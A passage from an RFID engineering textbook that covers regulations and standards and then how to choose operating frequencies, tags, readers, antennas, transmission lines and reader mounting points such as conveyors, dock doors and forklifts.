■ 
Regulations also help advancement of technology by directly or indirectly making 
it easier for more players to enter the market, thereby promoting entrepreneurship.
Advantages of Standards
What would there be without standards? Chaos: The same product from different vendors 
would work in different ways, and as a result, two instances of the same product from 
different vendors would not be interoperable with each other. In general, the following 
are the advantages of having standards in the RFID industry:
■ 
All devices following the same standard will be interoperable with each other. This 
helps consumers and therefore vendors as well.
■ 
Standards promote automation and thereby reduce duplication of effort. For example, 
whatever is standardized can be built once and used in other applications where it is 
needed rather than building it over and over again in the same or different ways.
■ 
Because the standards bodies are not serving the interest of just one vendor, the 
standards generally deﬁ ne the most efﬁ cient platform on which an industry can 
operate and advance.
■ 
Standards generally reduce cost and ease implementation.
■ 
Standards develop consumer conﬁ dence in the technology.
Looking at the other side of the coin, regulations and standards do have their 
disadvantages.

 
Working with Regulations and Standards • Chapter 5 
113
Disadvantages of Regulations and Standards
The following are the disadvantages of regulations and standards:
■ 
The highest limit on the emitted power sets the highest limit on the read range of 
a tag.
■ 
Passive tags are especially affected by the highest limit on the emitted power 
because they depend on the reader for the power that they use to power up their 
circuitry and to compose the response signal.
■ 
Because the regulated operating frequencies are different in different regions of 
the world, an RFID device that works in one region will not work in another 
region.
The advantages of regulations and standards often outweigh the disadvantages.

The three most important takeaways from this chapter are the following:
■ 
To allot the frequency usage for RFID devices (especially in the UHF band), the 
world is organized into three regulatory regions: Region 1 includes Europe and 
Africa, Region 2 includes the Americas, and Region 3 includes Asia and Australia.
■ 
The two organizations that develop standards for RFID are the ISO and 
EPCglobal.
■ 
The main advantage of RFID regulations is to make RFID devices safe and to 
prevent them from disrupting existing services in the RF arena. The main advantage 
of standards is the resulting interoperability.

Summary
The regulations in the RFID industry serve two main purposes: to keep RFID devices safe 
(for example, in the area of human exposure to radiation) and to prevent RFID devices from 
disrupting the existing services in the RF arena. These goals are established by regulating the 
maximum power emitted by the devices and by regulating operating frequencies. The world 
is organized into three regulatory regions: Region 1, which includes Europe; Region 2, 
which includes the Americas; and Region 3, which includes Asia and Australia.
The main purpose of RFID standards is to ensure interoperability: Different systems 
and components work together effectively. This helps an industry to advance, and it also 
helps create healthy marketing competition among vendors. There are two main standards 
 organizations in the RFID arena: ISO, which develops standards for several industries, and 
EPCglobal, which is speciﬁ c to RFID.
By now you have learned about tags, readers, the physics of RFID, and RFID standards 
and regulations. Equipped with this knowledge, you are prepared to select the design of your 
RFID system, which is the topic of the next chapter.

Chapter 6 • Selecting the RFID System Design
Introduction
You will design your RFID system to meet application performance requirements. Generally 
speaking, RFID is a means to identify an object by using radio frequency transmission, 
which suggests that communication is involved in the identiﬁ cation process. The communication 
takes place between a reader and a tag, which should be tuned to the same frequency. RFID 
systems are available at different frequencies. To select the right frequency for your system, 
you need to understand how the various performance parameters, such as read range, tag 
response time, and storage capacity, depend on the frequency. This understanding will also 
help you select the correct hardware components for your RFID system, such as readers, 
tags, and antennas. The tags are attached to the items that need to be identiﬁ ed and tracked, 
whereas readers will be mounted at places from where they will read the tags.
So, the core issue in this chapter is how to design your RFID system. To put our arms 
around this issue, we will explore three avenues: selecting operating frequency, selecting 
hardware components, and selecting mount points for readers.
Understanding RFID Frequency Ranges
A tag and a reader use radio waves of a certain frequency, called the operating frequency, to 
communicate with each other. Radio waves are electromagnetic waves that cover part of the 
electromagnetic spectrum of frequencies, called the radio frequency spectrum. Because RFID 
systems generate and radiate the electromagnetic waves that fall along the radio frequency 
spectrum, they are justiﬁ ably classiﬁ ed as radio systems and are regulated as such. However, 
other radio services have operated before the arrival of RFID systems. Radio, television, 
mobile radio services (police, security services, and industry), marine and aeronautical radio 
services, and mobile telephones are just a few. Therefore, it is important to ensure that these 
services are not disrupted or impaired by RFID systems. This requirement signiﬁ cantly 
restricts the suitable operating frequency ranges for RFID systems. For this reason, the so-called 
industrial, scientiﬁ c, and medical (ISM) frequencies, originally reserved for noncommercial 
uses in industrial, scientiﬁ c, and medical ﬁ elds, are used for RFID systems.
Table 6.1 shows the radio frequency ranges that are of interest to RFID systems, along 
with the ISM frequencies. RFID systems use many different frequencies in the radio frequency 
spectrum, but there are four most commonly used radio frequency ranges: low frequency 
(30–300 KHz), high frequency (3–30 MHz), ultra-high frequency (300 MHz–3 GHz), and 
microwave frequencies (1–300 GHz).
Table 6.1 also shows the read range for passive tags corresponding to each frequency 
range. Active tags can have a read range of up to 100 meters. For example, active tags used 
on large assets such as cargo containers, rail cars, and large reusable containers, which usually 
operate at 455 MHz, 2.45 GHz, or 5.8 GHz, typically have a read range of 20 meters to 
100 meters.

121
As shown in Table 6.2, regulatory bodies have chosen different ranges for RFID within 
the UHF band in different parts of the world. Broadly speaking, most of the countries have 
allocated the RFID bands from the following three ranges:
■ 
Range 1: 865-868 MHz For example, the bands allocated in India and Europe 
fall in this range.
■ 
Range 2: 902-928 MHz For example, the bands allocated in the United States 
and Australia fall in this range.
■ 
Range 3: 950-954 MHz For example, the bands allocated in Japan fall in this 
range.

surroundings is less an issue. This results in the system’s increased accuracy 
and security.

Note that in Table 6.2, the permitted radiated power, expressed in units of watts, is 
presented in different quantities. For example, in the United States, the radiated power is 
presented by EIRP, whereas Europe tends to use ERP. As demonstrated in Exercise 6.1, 
the conversion must be done between ERP and EIRP when necessary while comparing 
these numbers.

CAUTION
Today, the only globally accepted radio frequency for RFID systems is 
13.56 MHz, which falls in the HF band.
So, RFID systems operate in four main ranges of the radio frequency spectrum: LF, HF, 
UHF, and microwave. Although the choice of frequency does not affect the underlying 
physics of how the system components will operate, it does affect the system’s performance 
in areas such as speed, range, and accuracy.
RFID Frequency Ranges and Performance
While designing your RFID system, you will need to decide at which frequencies the 
RFID devices (readers and tags) will operate. To decide wisely, you need to know the 
applications’ performance requirements and how your frequency choices will impact 

 
Selecting the RFID System Design • Chapter 6 
123
performance. Let’s take a close look at the way frequency ranges affect various performance 
metrics.
The Low-Frequency (LF) Range
The LF range extends from 30 KHz to 300 KHz. The RFID systems in this range typically 
operate at ISM frequencies 125 KHz and 134 KHz. Some important characteristics related 
to performance of RFID systems operating in the LF range are as follows:
■ 
Short read range The read range of RFID systems operating in the LF range is 
short: less than half a meter.
■ 
Lower reading speed In general, the higher the frequency, the longer the read 
range, and the higher the data transfer rate will be. Data transfer rate is directly 
proportional to available bandwidth.
■ 
Less absorption Because wavelength is inversely proportional to frequency, the 
lower the frequency of an RFID system, the higher is the wavelength. Due to the 
higher wavelength, the LF signals are not easily absorbed by the atmosphere and 
the material they move through. For this reason, RFID systems operating in the 
LF range work well around water and metal.
Due to the short read range and less absorption, LF systems are more robust to external 
inﬂ uences. Based on these characteristics, the following are common applications of RFID 
systems in the LF range:
■ 
Access control
■ 
Animal and personnel tracking
■ 
Vehicle immobilizers
TIP
The bandwidth available at low frequency is very limited, which results in 
very slow data transfer rates. For example, in the case of the International 
Standard ISO 18000 Part 2 covering LF RFID systems, the command signaling 
rate (meaning the communication speed between reader and tag) is only 
around 5 kbits/second.
The next step on the frequency ladder is HF.

124 
Chapter 6 • Selecting the RFID System Design
The High-Frequency (HF) Range
The HF range extends from 3 MHz to 30 MHz. RFID systems in this range usually operate 
at 13.56 MHz, which is a globally accepted frequency for RFID systems. Some important 
performance-related characteristics of RFID systems operating in this range are described 
in the following:
■ 
The read range is about 3 m.
■ 
Due to shorter wavelengths, the signals in this range cannot penetrate through 
materials as well as the LF signals can.
■ 
This frequency range provides greater options in data transfer speed, compared 
to LF.
Due to these characteristics, following are typical applications for RFID systems in the 
HF range:
■ 
Building access control
■ 
Item-level tracking, including baggage handling
■ 
Libraries
Because 13.56 MHz is the globally accepted frequency standard for RFID systems, 
the HF RFID systems have been more broadly adopted.
The next step on the frequency ladder is UHF.
Ultra High Frequency (UHF) Range
The UHF range extends from 300 MHz to 3 GHz. As Tables 6.1 and 6.2 show, the 
actual frequencies being used by RFID systems operating in this range are 344 MHz 
and 860–960 MHz. The reading speed and data transfer rate for these systems can be high. 
However, systems in this range are relatively new and encounter a host of problems, some 
of which are described in the following:
■ 
Due to smaller wavelength, the RF energy can be easily absorbed by liquids and 
matter. It can considerably reduce the reading range.
■ 
The high reading speed creates more probability for errors.
■ 
As shown in Table 6.2, countries have allocated different frequencies for RFID 
systems in this range; therefore, a UHF system that works in one country might not 
work in another country.
■ 
Many consumer devices also operate in the same frequency range; therefore, RFID 
systems in this range are subject to interference with their signals.

 
Selecting the RFID System Design • Chapter 6 
125
The higher reading speed and longer read distance make these systems attractive for the 
following applications:
■ 
Automated toll collection
■ 
Warehouse management
■ 
Inventory tracking
The next step on the frequency ladder is the microwave frequency range.
The Microwave Range
The microwave range extends from 1 GHz to 300 GHz. RFID systems in this range operate 
at ISM frequencies, 2.44 GHz and 5.80 GHz, which offer high data transfer rate. Following 
are some of the characteristics of microwave RFID systems:
■ 
High reading speed and data transfer rate
■ 
Long read distance
■ 
Poor performance around water and metal
Due to these characteristics, the microwave RFID systems are used in the following 
applications:
■ 
Long-range access control for vehicles
■ 
Vehicle identiﬁ cation
■ 
Automated toll collection
■ 
Supply chain
Advantages and disadvantages of various frequency ranges and the typical RFID applications 
corresponding to each range are summarized in Table 6.3. Figure 6.1 shows how some 
characteristics of an RFID system depend on the frequency.

In a nutshell, RFID tags and readers must be tuned to the same frequency to communicate 
with each other. Frequencies exhibit different behavior in terms of characteristics that make 
them more useful for different applications. For example, LF tags are cheaper than UHF tags, 
use less power, and are better able to penetrate through water. Therefore, they are suitable for 

 
Selecting the RFID System Design • Chapter 6 
127
scanning objects with high-water content, such as fruit, at close range. UHF systems typically 
offer better read range and speed and can transfer data faster. But they use more power and 
are less likely to pass through materials. Combine this information with the fact that UHF 
waves tend to be more “directed,” they require a clear path between the tag and reader. 
These characteristics make UHF systems more suitable for applications such as scanning 
boxes of goods as they pass through a bay door into a warehouse.
The read range performance of an RFID system is an important characteristic and is 
typically determined to a large extent by the following factors:
■ 
The power radiated by the reader, which is regulated Passive tags get their 
power from the energy coming from the power radiated by the reader.
■ 
The operating frequency The power received by the tag’s receiver depends on 
the antenna size, which in turn depends on the frequency (or wavelength) of the 
received signal.
■ 
The sensitivity of the tag The maximum read distance depends on the tag’s 
power requirements, which in turn depend on the tag type (active or passive) and 
the tag’s antenna size.
■ 
Communication technique The read range also depends on which communication 
technique the RFID system is using: inductive coupling or backscattering.
Now that you understand how frequency choices impact RFID system performance, 
you are well equipped to start exploring ways to select operating frequency for your RFID 
system.
Selecting Operating Frequency
By now you know that RFID devices (tags and readers) are available at different frequencies. 
You also know how different performance metrics depend on the frequency. But how do 
you decide at which of these available frequencies your system should operate? The short 
answer to this question is, it all depends on the application requirements and the operating 
conditions. That said, following are the main factors that you should consider in selecting 
operating frequency:
■ 
Application types Because all applications in each application type such as retail, 
automatic toll collection, and animal tracking have a common set of requirements, 
most application types are associated with speciﬁ c frequencies.
■ 
Read range Read range depends on frequency, among other factors. So, the read 
range requirement of your application will give you a very good idea as to which 
frequency you should select for your system.

128 
Chapter 6 • Selecting the RFID System Design
■ 
Operating conditions In making a frequency selection, you should also factor 
in the conditions under which your system will operate. For example, if there is 
water (or water-related conditions, such as mud or snow) or metal in the vicinity of 
the RFID system, LF and HF are the ideal frequency selections. This is because LF 
and HF can penetrate through these materials better than UHF and microwave 
frequencies can.
Now that you understand how frequency choices impact RFID system performance and 
how you select the operating frequency, you are well equipped to start exploring how to 
select individual components of an RFID system, such as tags.
Selecting Tags
To select the right tags for your application, you need to consider various factors such as tag 
kind (tag types and tag classes), operating frequency, read range, data capacity, tag form and 
size, environmental conditions under which the tags will operate, and the standards and 
regulations with which you need to comply. Most of these characteristics have already been 
discussed in Chapter 4 and in this chapter. Here we present a brief discussion regarding the 
role of these factors in selecting tags.
Kinds of Tag
The kind (type and class) of tag that you select depends on the application requirements. 
Following are some examples and scenarios.
Tag Types
If the application simply requires the tag to store some data such as identiﬁ cation number 
and provide it on request, you can use passive tags. However, if real-time features such as 
sensing the temperature and humidity are required, you must select active tags, because your 
data will need real-time processing.
Tag Classes
Tag classes offer different features such as read only (RO), write once and read many 
( WORM), and read and write (RW). If the application requires the tag to store a unique 
identiﬁ er that will not change and provide it when requested, simply use RO or WORM 
tags. If the application requires the tag to store dynamic data (data that is subject to change), 
you need RW tags.

 
Selecting the RFID System Design • Chapter 6 
129
Operating Frequency
This chapter has already discussed the frequencies available for RFID systems and how to 
make the frequency selection. There are two important points to note:
■ 
Different frequency bands are allotted to RFID systems in different regions of the 
world.
■ 
From the available frequencies, you need to select the right frequency for your 
system based on the application requirements. The higher the frequency, the larger 
the read range.
Read Performance
Read performance of a tag depends on the following factors:
■ 
Read range The read range is the maximum distance from which a reader 
antenna can read a tag. This range is required by the application for which you 
are selecting the tag. Read range is discussed in detail in Chapter 4.
■ 
Antenna polarization and orientation Antenna polarization and tag 
orientation, discussed in Chapter 4 and further in this chapter, also affect read 
performance. For optimal reading, tag orientation should be consistent with 
antenna polarization.
■ 
Reading efﬁ ciency The reading efﬁ ciency, also called read robustness, is the 
ratio of the number of successful reads to the total number of read attempts. 
This is the ultimate factor that needs to be optimized to improve 
performance.
CAUTION
It’s very easy to get carried away in maximizing the read range. But it’s 
really the reading efﬁ ciency that you should be maximizing. The read 
range should only satisfy the application requirement. Unnecessarily high 
read ranges may have a negative impact on the system in terms of 
interference and security.

130 
Chapter 6 • Selecting the RFID System Design
The factors that can cause a reduction in reading efﬁ ciency include the following:
■ 
Attenuation, a decrease in the signal amplitude, caused by different product and 
packaging materials (such as liquids and metals) when the signal passes 
through them
■ 
Presence of metal close to RFID antennas, or a large (as compared to antenna size) 
mass of metal passing an antenna, which can create a mismatch between the 
characteristics of the antenna and the reader
■ 
Radio frequency interference (RFI) from RF transmitters and electrical drives, motors, 
and power supplies in the location of the RFID antenna system
Data Capacity
The term data capacity refers to the amount of data (information) that can be stored in a tag. 
Increased data capacity increases the usefulness of the tag and its cost. While selecting the 
data capacity, you should consider the following factors:
■ 
Data amount For applications that only require the tags to store the identiﬁ cation 
number, you can simply use tags that offer minimal storage, such as class 0 tags. 
For applications that require more data capacity, tags with appropriate memory 
can be selected accordingly.
■ 
Data security Some applications could require data locking to prevent tempering 
with the tag data. Data locking can be implemented at either the hardware or software 
level. For read-only tags, such as class 0 tags, the identiﬁ er is permanently burned 
into the tag and cannot be changed. WORM and RW tags can use software locks 
by implementing password schemes.
Tag Form and Size
The tag form and size should be compatible with the item and the environment. For example, 
the tag needs to ﬁ t on the item. Tag forms and sizes are discussed in detail in Chapter 4. 
Following are the two main factors that you should consider regarding the tag form and size:
■ 
Tag dimensions The dimensions of a tag should be suitable for the size and 
shape of the item that needs to be tagged. For example, you should consider the 
space available for the tag on the item without obstructing any critical information 
printed on the product’s surface.
■ 
Tag ruggedness Your application could require a rugged tag to withstand harsh 
environmental conditions such as corrosive chemicals, extremely high or low 
temperature, humidity, and mechanical shocks. A tag can be made rugged by 
enclosing it in a cover. Rugged tags are usually expensive.

 
Selecting the RFID System Design • Chapter 6 
131
Environmental Conditions
Environmental conditions can affect the performance of a tag and therefore the selection 
of the tag for an application. You should consider the following environmental factors in 
selecting tags:
■ 
Other objects in the neighborhood of the item to be tagged
■ 
Other environmental conditions, such as extreme temperature and humidity
Standards Compliance
You should make sure that the tags you select meet the established and emerging standards. 
This is important to ensure compatibility and interoperability with other systems meeting 
those standards.
The two main components of an RFID system are tag and reader, and the two should 
be compatible with each other. So, the process of selecting tags is tied into selecting readers.
Selecting Readers
A reader’s job is to collect data from tags and possibly send it to an application running on a 
host computer. This section discusses the factors that need to be considered in selecting readers.
Reader Types
When selecting a reader type, consider the following characteristics:
■ 
Operating frequency This chapter has already discussed the frequencies 
available for RFID systems. There are two important points to note:
■ Different frequency bands are allotted to RFID systems in different regions 
of the world.
■ From the available frequencies, you need to select the right frequency for 
your system based on application requirements. The higher the frequency, 
the larger the read range.
CAUTION
Do not fold a tag to reduce its size. Folding it can detune the tag antenna, 
which then can fail to receive enough power from the reader antenna and 
therefore will fail to respond to the reader.

132 
Chapter 6 • Selecting the RFID System Design
■ 
Number of antennas Most readers support a minimum of two and a maximum 
of four antenna ports. However, a reader can have one, four, or eight antenna ports. 
You cannot go wrong in simply choosing a reader with four antenna ports because 
it offers better ﬂ exibility in covering a wide read zone. The number of ports you 
need with a reader really depends on the application’s needs.
■ 
Reader interfaces Often the reader needs to send the collected data somewhere. 
So the readers come with I/O controllers which support the interfaces for sending 
out the collected data. Depending on the type of interface, it may connect the 
reader to a host computer serially, or it may connect the reader to a network.
■ 
The reader mobility Based on application requirements, you might need a 
ﬁ xed or a mobile reader. Mobile readers are usually wireless readers. That is, they 
connect to the network using wireless technology.
Ability to Upgrade
The ability to upgrade the readers can considerably reduce the system cost in the long run. 
This ability should allow you to upgrade the ﬁ rmware and ﬁ x bugs in it.
Installation Issues
While selecting a reader, you should also consider the installation requirements. Following 
are some examples:
■ 
Properly installing a speciﬁ c reader could require additional structure, such as 
a portal that needs to be built.
■ 
The reader and its cable (transmission line) must not pose a risk to operations 
personnel in the area.
■ 
The long cables to connect a reader to its antenna can attenuate the signals. If the 
distance between the antenna and the reader is such that the installation requires 
a cable longer than 6 feet, the cable better be of high quality and low loss.
Legal Requirements
The maximum power that transmitter can emit is regulated in most countries. It means that 
you must make sure that the selected readers comply with those regulations. It also means 
that you should not tamper with the features of the readers that comply with the 
regulations.

 
Selecting the RFID System Design • Chapter 6 
133
Manageability
Depending on the application requirements, you might need a reader that can be managed 
remotely, for example, using Simple Network Management Protocol (SNMP). This gives you 
the advantage of tracking, diagnosing, and ﬁ xing errors remotely, without manually visiting 
the site.
Quantity
You will also need to determine how many readers you will need for your application. This 
number will depend on the following:
■ 
Number of read zones
■ 
Number of reader antennas required for each zone
■ 
Number of antenna portals on each reader
Ruggedness
Your application could require rugged packaging to withstand harsh environmental conditions 
such as corrosive chemicals, extremely high or low temperature, humidity, and mechanical 
shocks. A reader can be made rugged by enclosing it in a cover. Rugged tags are usually 
expensive.
By now, you have a very good idea of how to select tags and readers. Both tags and 
readers have antennas, which we’ll examine next.
Working With Antennas
In general, an antenna is any structure or device used to receive or radiate electromagnetic 
waves. As you already know, both tags and readers have their own antennas. You need to 
select appropriate antennas for your RFID system because they come in various types and 
conﬁ gurations. Before selecting an antenna, you should understand the antenna types.
Understanding Antenna Types
This section discusses the common antenna types listed in the following:
■ 
Monopole antenna
■ 
Dipole antenna
■ 
Linearly polarized antenna

134 
Chapter 6 • Selecting the RFID System Design
■ 
Circularly polarized antenna
■ 
Omnidirectional antenna
■ 
Helical antenna
Before we could talk about antenna types, you should know the deﬁ nitions of the 
following terms:
■ 
Channel A single path provided by a transmission medium. This path may be 
provided by a cable or by a speciﬁ c frequency.
■ 
Source An object that encodes the message data and transmits it via a channel to 
one or more receivers.
■ 
Driven element The single antenna that has an applied source feed.
■ 
Ground plane An electrically conductive surface that serves as the reﬂ ection 
point near an antenna or as a reference ground in a circuit.
Dipole Antennas
A dipole antenna is an antenna with a center-fed driven element for transmitting or receiving 
radio frequency energy. From a physics viewpoint, this type of antena is the simplest practical 
antena. It consists of a straight elctric conductor, made of conducting metal such as copper, 
interrupted at the center, therefore making two poles. As shown in Figure 6.2, the category 
of dipole antennas can be further subdivided as into the following:
■ 
Half-wavelength dipole The total length of this antenna is half the wavelength 
corresponding to the frequency to be used. It optimizes the transfer of power 
between the tag and the reader.
■ 
Quarter-wavelength dipole The total length of this antenna is a quarter 
the wavelength corresponding to the frequency to be used. It uses the 
reﬂ ective ground plane that provides an image of the antenna to complete the 
dipole.
■ 
Dual dipole antenna As the name suggests, a dual dipole antenna consists of 
two dipoles. It covers more area and therefore reduces the sensitivity of a tag’s 
orientation.
■ 
Folded dipole antenna This antenna consists of two or more straight electric 
conductors that are connected in parallel, and each electric conductor is half the 
wavelength corresponding to the frequency to be used.

 
Selecting the RFID System Design • Chapter 6 
135
Monopole Antennas
A monopole antenna is a type of dipole antenna formed by replacing one half of the dipole 
antenna with the ground plane at a right angle to the remaining half. If the ground plane 
is large enough, the monopole behaves exactly like a dipole because its reﬂ ection in the 
ground plane forms the missing half of the dipole. The most common example of a 
monopole antenna is a whip antenna, which is basically a stiff but ﬂ exible wire, usually 
mounted vertically.
Linearly Polarized Antenna
As you know, as a wave travels, there are variations (or vibrations) in the wave, such as 
variations in electric ﬁ eld or magnetic ﬁ eld of an EM wave. As described in Chapter 1, 
the variations of electric and magnetic ﬁ elds (vectors) in an EM wave are in a plane 
perpendicular to the direction of propagation of the wave. If the variations are such that 
the electric ﬁ eld vector stays parallel to a line in space as the wave travels, the wave is said 
to be linearly polarized, and the antenna that transmits such a wave is called a linearly 
polarized antenna. Because magnetic ﬁ eld (perpendicular to electric ﬁ eld) will also stay 
parallel to a line in space, this ﬁ xes the plane of the electric and magnetic ﬁ eld vectors.

Chapter 6 • Selecting the RFID System Design
Therefore, linear polarization is also called plane polarization. The following two kinds of 
linear polarization are of special interest:
■ 
Horizontal polarization This is the linear polarization in which the wave 
travels horizontal to the surface of the Earth.
■ 
Vertical polarization This is the linear polarization in which the wave travels 
perpendicular to the surface of the Earth.
NOTE
Horizontally polarized waves (signals) travel parallel to Earth’s surface, 
whereas perpendicularly polarized waves travel perpendicular to the surface 
of Earth. If you look carefully at TV antennas, you will ﬁ nd that most of 
them have rods about a meter in length set horizontal to the earth’s sur-
face. That means that the carrier waves for TV are polarized horizontally—
that is, the electric vector is horizontal, the magnetic vector is vertical, and 
both lie in a plane perpendicular to the direction of propagation of the 
wave. So, antennas are set broadside to the direction of propagation of 
the wave.
A linearly polarized antenna emits a narrow radiation beam that increases the read range 
of a tag. However, a linearly polarized antenna of a reader is sensitive to the tag orientation 
with respect to polarization. Therefore, this type of antenna is useful for applications in 
which the tag orientation is ﬁ xed and known (predictable). Dipole antennas are linearly 
polarized.
Circularly Polarized Antennas
A traveling EM wave is said to be circularly polarized if the electric ﬁ eld vector rotates 
in a circle as the wave travels. The antenna that emits circularly polarized waves is called 
a circularly polarized antenna. A circularly polarized signal contains horizontal and vertical 
components. Therefore, a circularly polarized reader antenna is largely unaffected by tag 
orientation. For example, if the tag is oriented to receive horizontally polarized waves 
and the reader antenna is emitting circularly polarized waves, the tag will still receive the 
horizontal component of the signal power. For this reason, a circularly polarized reader 
antenna is preferred in applications in which the tag orientation is unknown or 
unpredictable.

 
Selecting the RFID System Design • Chapter 6 
137
Omnidirectional Antennas
An omnidirectional antenna is a nondirectional antenna that radiates power uniformly in all 
directions. An ideally perfect omnidirectional antenna is also called an isotropic antenna, which 
is really a theoretical antenna used as a reference to calculate quantities such as antenna 
gain and effective radiated power (ERP). Practically speaking, the antennas can provide 
omnidirectionality in one plane, such as in a horizontal plane—that is, the plane parallel 
to the surface of the Earth.
Helical Antennas
As shown in Figure 6.3, a helical antenna is an antenna that consists of a conducting wire 
wound in the form of a helix. A helical antenna is an example of a circularly polarized 
antenna. Note the following about helical antennas:
■ 
The length of the antenna coil determines the antenna gain.
■ 
The diameter of the antenna coil determines its wavelength.
■ 
Because helical antennas are circularly polarized antennas, they can receive signals 
with any type of polarization, such as linear, horizontally linear, or vertically linear.
■ 
A helical antenna can be clockwise polarized or anticlockwise polarized. Clockwise 
polarized antennas will have poor antenna gain when receiving a signal that is 
anticlockwise polarized.
Figure 6.3 Helical Antennas
These antennas are best suited for applications such as animal tracking and space 
communication, where the orientation of the sender and receiver cannot be easily controlled 
or where the signal’s polarization may change over time.
Selecting Antennas
When selecting antennas, you should consider the following factors:
■ 
Footprints The footprint of an antenna is the ground area over which the 
antenna delivers a speciﬁ ed amount of signal power under speciﬁ ed conditions. 
That means a tag placed within the footprint of a reader’s antenna can be read by 
the antenna. Because RFID antennas are mostly directional, the footprint of an 

138 
Chapter 6 • Selecting the RFID System Design
antenna is rarely symmetrical around the antenna. You can use a device such as a 
spectrum analyzer to determine the actual footprint map of an antenna.
■ 
Polarization Remember the following two things about polarization:
■ If the tag orientation is arbitrary, unknown, or unpredictable, use circularly 
polarized antennas, because circularly polarized waves have both horizontal 
and vertical components. That means that if the antennas are circularly 
polarized, there will always be a transfer of some amount of power between 
the reader and the tag antennas, regardless of the tag orientation.
■ If the tag orientation with respect to the antennas is known, use a linear 
antenna to receive the maximum power and thereby increase the read range.
■ 
Standards and regulations You should be aware of the standards and regulations 
regarding the characteristics of RFID systems in your region of the world, such as 
the allowed operating frequency and the allowed maximum power to be emitted by 
the antenna. This is important for two reasons: to obey the law of the land and to 
be compatible with the environment.
The source of a reader that generates the signal is connected to the antenna through a 
transmission line.
Selecting Transmission Lines
In an RFID system, a transmission line is a physical medium (say a cable) used to connect 
the signal source to the antenna. The optimal transmission line would be the one that 
transfers the energy (power) from the source to the antenna with minimum power loss. 
When selecting a transmission line, you should be aware of the characteristics discussed in 
this section.
Impedance
You learned in Chapter 2 what impedance is and how an impedance mismatch between 
antenna and transmission line will create a reﬂ ected wave, which will result in decreased 
system efﬁ ciency. For optimal results, you must match the input impedance of the antenna 
with the characteristic impedance of the transmission line.
Cable Length and Loss
When you’re choosing the physical length of a transmission line, keep in mind its electrical 
length, which is its length expressed as a multiple (or submultiple) of the wavelength of the 
signal that will propagate through it. Consider a cable that will transmit a signal of 3 GHz. 
The wavelength corresponding to 3 GHz is 10 cm. Now consider a 4 m cable. If the electrical 

 
Selecting the RFID System Design • Chapter 6 
139
length of the cable is expressed in units of l/4, the electrical length of this cable = 400/(10/4) = 
160 units. So, the transmission line in this case is electrically too long. The longer the line, the 
greater will be the power loss.
Transmission Line Types
The cable types most commonly used to form a transmission line are the following:
■ 
Coaxial cable This cable consists of two coaxial conductors separated by a plastic 
insulating material. The inner conductor is a copper wire surrounded by the outer 
conductor, which is a braided wire jacket, a copper mesh. The outer conductor is 
then shielded with an insulating material. This cable type is useful to transmit 
low-amplitude signals because it can protect (shield) the signal from external inter-
ference. This is because the electromagnetic ﬁ eld carrying the signal exists only in the 
space between the outer and the inner signal. So the signal is shielded from external 
interference, which results in low loss. Following are the advantages of this cable type:
■ Low loss
■ Can be used to efﬁ ciently transmit low-amplitude signals
■ Useful for frequencies up to 3 GHz
■ 
Shielded pair cable This cable consists of two parallel conducting wires 
embedded in solid dielectric material, which is surrounded by braided copper 
tubing, which in turn is surrounded by a rubber cover. The braided copper tubing 
acts as an electrical shield against external electromagnetic interference. The rubber 
cover protects the line from mechanical damage and moisture.
So, a reader has a source, a transmission line, and an antenna. The reader needs to be 
mounted at a place from where it will read the tags.
Mounting Equipment for RFID Systems
Tags attached to items carry information about the items. These tags need to be read by 
readers to retrieve the information. An RFID portal is the area where RFID tags can be 
read or written to. The portals can be grouped into two categories:
■ 
Stationary portals These are the portals on which readers are mounted at a 
predetermined ﬁ xed place and wait for the tags to pass through their interrogation 
zone. This kind of portal is used in applications in which the path of the items 
containing tags is predetermined, such as along a conveyor.
■ 
Mobile portals These are the portals in which readers are moved around to read 
the tags. Such portals are useful for applications in which the tagged items do not 
travel a predetermined path.

140 
Chapter 6 • Selecting the RFID System Design
The common candidate portal points for mounting your RFID system are the following:
■ 
Conveyer
■ 
Dock door
■ 
Forklift
■ 
Point of sale
■ 
Smart shelf
■ 
Stretch wrap station
These portal points are discussed in the following sections.
Conveyors
Conveyors are used for case-level tracking—for example, in airports. To achieve the optimal 
results, multiple reader antennas should be used. Reader antennas are often mounted on 
gantries placed around the conveyor, as shown in Figure 6.4. The reader antennas on each 
side of the gantry will cover four faces of the container.
Figure 6.4 The Front View of a Conveyor Portal
Antennas
Gantry
Gantry
Container
For optimal reading, consider the following factors in selecting a conveyor:
■ 
The conveyor belt and the roller for the conveyor at the read point should be made 
of RF-friendly material, not of metal.

 
Selecting the RFID System Design • Chapter 6 
141
■ 
The speed of the conveyor belt should adjusted for optimal tag reading.
Conveyors are good for case-level reading, whereas dock doors are suitable for 
pallet-level reading.
Dock Doors
A dock is a platform on which trucks or trains load or unload cargo. Keep in mind that the 
portal readers on a dock door might have to work in the presence of other electronic 
devices such as detectors and RF-reﬂ ective surfaces such as metal mesh. For example, the 
metal mesh surrounding the doorway could prevent reading of the tags going through 
adjoining doors.
In general, a door portal does not necessarily have to have a physical door. The term door 
portal, in general, refers to a vehicle carrying items in transit from one area to a different area. 
For example, when a truck parks and unloads at a dock door, items are stored or retrieved 
through a causeway, and a vehicle (mobile equipment) passes through the interior of racking 
aisles. Depending on the nature of the door portal (application), antennas can be mounted in 
various conﬁ gurations. For example, multiple antennas are used in an array on both sides of 
the door to form the interrogation zone. When a transport vehicle such as a cart, a clamp 
truck, or a hand pallet truck passes through this interrogation zone, the door portal will read 
the tags attached to the items on the vehicle.
In setting up a door portal, you should consider the following:
■ 
Your conﬁ guration of reader antennas should be able to cover (in reading) an area 
about 3 meters high and about 3 meters wide.
■ 
The antennas need to be arranged in a sequence (that is, in an array) on each side 
of the door to form an effective interrogation zone.
■ 
It is important to meet the minimum effective power level across the surface of the 
interrogation zone.
■ 
In the case of a motion-triggered portal, the readers must be turned on in a timely 
fashion so that they can read in the minimum effective duration.
An alternative to a door portal is a forklift.
Forklifts
A forklift is a powered industrial truck used to lift and transport loads of materials by means 
of steel forks inserted under the load. A forklift is most commonly used to move a load 
stored on a pallet. These are especially well suited for reading tags from items on a pallet 

142 
Chapter 6 • Selecting the RFID System Design
due their mobility and ﬂ exibility. The forklift can be connected to vehicle-mounted, 
data-collecting computers to inventory items efﬁ ciently. Following, however, are the 
disadvantages of mounting antennas on a forklift:
■ 
A forklift-based reading system requires manual intervention from an operator.
■ 
The communication devices used by forklift operators can cause RF interference 
and affect the readability of tags.
■ 
Metallic forks can reﬂ ect RF signals from the RFID system and therefore could 
prevent reading of some tags.
■ 
The speed of the forklift can also affect readability.
Stretch Wrap Stations
A stretch wrap has containers sitting on a turntable, which continuously changes the location 
and orientation of the tags. This is what makes a wrap station an attractive portal for reader 
